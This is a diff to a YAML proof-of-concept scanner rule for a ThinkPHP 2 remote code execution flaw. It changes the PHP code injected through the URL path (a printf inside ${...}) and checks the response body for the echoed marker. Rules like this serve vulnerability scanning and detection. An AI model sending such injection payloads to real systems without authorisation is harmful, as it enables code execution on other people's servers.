@@ -1,7 +1,7 @@
 name: poc-yaml-thinkphp2-rce
 rules:
   - method: GET
-    path: /index.php/module/action/param1/$%7B@printf(md5(2000%%0206))%7D
+    path: /index.php/module/action/param1/$%7B@printf('2000%%0206')%7D
     follow_redirects: false
     expression: |
       status == 200 && body.bcontains(b'2000%0206')
